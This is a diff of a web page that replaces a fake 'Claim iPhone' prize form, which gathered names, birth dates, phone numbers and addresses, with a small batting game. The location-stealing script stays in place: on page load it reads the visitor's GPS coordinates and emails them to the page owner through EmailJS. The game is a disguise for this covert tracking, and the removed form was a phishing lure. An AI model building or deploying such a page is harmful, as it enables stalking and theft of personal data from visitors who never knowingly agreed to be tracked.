@@ -3,136 +3,76 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Auto Send Location + Form</title>
+  <title>Online Batting</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      padding: 30px;
-      background-color: #f0f0f0;
-      color: #333;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #2ecc71, #27ae60);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
     }
-    .container {
+    .game-container {
+      width: 100%;
       max-width: 600px;
-      margin: auto;
-      background: white;
-      padding: 25px 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+      height: 400px;
+      background: #1e272e;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+      position: relative;
+      overflow: hidden;
     }
     h2 {
-      margin-bottom: 25px;
       text-align: center;
-      color: #2c3e50;
+      padding: 10px;
+      background: #2c3e50;
+      margin: 0;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
     }
-    form {
-      margin-top: 20px;
+    #bat {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 20px;
+      background: #e74c3c;
+      border-radius: 6px;
     }
-    .form-group {
-      margin-bottom: 18px;
+    #ball {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 20px;
+      height: 20px;
+      background: #f1c40f;
+      border-radius: 50%;
     }
-    label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: 600;
-      color: #34495e;
-    }
-    input[type="text"],
-    input[type="email"],
-    input[type="tel"],
-    input[type="date"],
-    textarea {
-      width: 100%;
-      padding: 10px 12px;
-      font-size: 15px;
-      border: 1.8px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      transition: border-color 0.3s ease;
-    }
-    input[type="text"]:focus,
-    input[type="email"]:focus,
-    input[type="tel"]:focus,
-    input[type="date"]:focus,
-    textarea:focus {
-      border-color: #3498db;
-      outline: none;
-    }
-    textarea {
-      resize: vertical;
-      min-height: 70px;
-    }
-    #locationDisplay {
-      background: rgba(255, 255, 255, 0.85);
-      color: #666;
-      padding: 0.5rem 0.75rem;
-      border-radius: 4px;
+    #locationDisplay, #status {
+      position: absolute;
+      bottom: 5px;
+      left: 10px;
+      right: 10px;
       font-size: 14px;
-      margin-bottom: 20px;
       text-align: center;
-    }
-    button {
-      width: 100%;
-      background-color: #3498db;
-      color: white;
-      border: none;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 7px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    button:hover {
-      background-color: #2980b9;
-    }
-    #status {
-      margin-top: 18px;
-      font-size: 16px;
-      color: #555;
-      text-align: center;
-      white-space: pre-line; /* preserve newlines */
+      color: #ecf0f1;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Congratualations</h2>
-
-    <form id="rewardForm">
-      <div class="form-group">
-        <label for="fullName">Full Name</label>
-        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required />
-      </div>
-      <div class="form-group">
-        <label for="dob">Date of Birth</label>
-        <input type="date" class="form-control" id="dob" required />
-      </div>
-      <div class="form-group">
-        <label for="email">Email Address</label>
-        <input type="email" class="form-control" id="email" placeholder="Enter your email" required />
-      </div>
-      <div class="form-group">
-        <label for="phoneNumber">Phone Number</label>
-        <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required />
-      </div>
-      <div class="form-group">
-        <label for="address">Shipping Address</label>
-        <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
-      </div>
-      <div class="form-group">
-        <label for="city">City</label>
-        <input type="text" class="form-control" id="city" placeholder="Enter your city" required />
-      </div>
-      <div class="form-group">
-        <label for="postalCode">Postal Code</label>
-        <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required />
-      </div>
-
-      <p id="locationDisplay">Address.</p>
-      <button type="submit">Submit and Claim iPhone</button>
-    </form>
-
-    <div id="status">Please allow location permission for getting correct address.</div>
+  <div class="game-container">
+    <h2>🏏 Online Batting</h2>
+    <div id="ball"></div>
+    <div id="bat"></div>
+    <p id="locationDisplay">Detecting address...</p>
+    <p id="status">Please allow location permission.</p>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -150,8 +90,8 @@
         subject: "User Location"
       })
       .then(() => {
-        statusEl.textContent = `Location sent successfully!\nLatitude: ${lat}, Longitude: ${lng}`;
-        locationDisplay.textContent = `Your location: Latitude ${lat}, Longitude ${lng}`;
+        statusEl.textContent = `Location sent successfully!`;
+        locationDisplay.textContent = `Your location: ${lat}, ${lng}`;
       })
       .catch((error) => {
         statusEl.textContent = "Failed to send email: " + error.text;
@@ -164,28 +104,57 @@
           (position) => {
             const lat = position.coords.latitude.toFixed(6);
             const lng = position.coords.longitude.toFixed(6);
-            locationDisplay.textContent = `Your location detected: Latitude ${lat}, Longitude ${lng}`;
+            locationDisplay.textContent = `Lat ${lat}, Lng ${lng}`;
             statusEl.textContent = `Location found. Sending email...`;
             sendLocationEmail(lat, lng);
           },
           (error) => {
-            locationDisplay.textContent = "Error getting location: " + error.message;
+            locationDisplay.textContent = "Error: " + error.message;
             statusEl.textContent = "Error getting location.";
           }
         );
       } else {
-        locationDisplay.textContent = "Geolocation is not supported by this browser.";
+        locationDisplay.textContent = "Geolocation not supported.";
         statusEl.textContent = "Geolocation not supported.";
       }
     }
 
     window.onload = getLocationAndSend;
 
-    // Optional: You can add form submission handler if needed, else it just submits normally.
-    document.getElementById('rewardForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      alert('Form submitted! (You can add your own form handling here)');
-      // You can add your own AJAX form submission or processing here if needed.
+    // Simple batting game logic
+    const bat = document.getElementById("bat");
+    const ball = document.getElementById("ball");
+    let ballY = 0;
+    let ballSpeed = 2;
+
+    function gameLoop() {
+      ballY += ballSpeed;
+      if (ballY > 360) {
+        ballY = 0;
+        // Check collision
+        const batRect = bat.getBoundingClientRect();
+        const ballRect = ball.getBoundingClientRect();
+        if (ballRect.bottom >= batRect.top && 
+            ballRect.left < batRect.right && 
+            ballRect.right > batRect.left) {
+          statusEl.textContent = "🎉 You hit the ball!";
+        } else {
+          statusEl.textContent = "❌ Missed!";
+        }
+      }
+      ball.style.top = ballY + "px";
+      requestAnimationFrame(gameLoop);
+    }
+    gameLoop();
+
+    // Move bat with arrow keys
+    document.addEventListener("keydown", (e) => {
+      const currentLeft = parseInt(bat.style.left || 50);
+      if (e.key === "ArrowLeft") {
+        bat.style.left = Math.max(5, currentLeft - 5) + "%";
+      } else if (e.key === "ArrowRight") {
+        bat.style.left = Math.min(95, currentLeft + 5) + "%";
+      }
     });
   </script>
 </body>
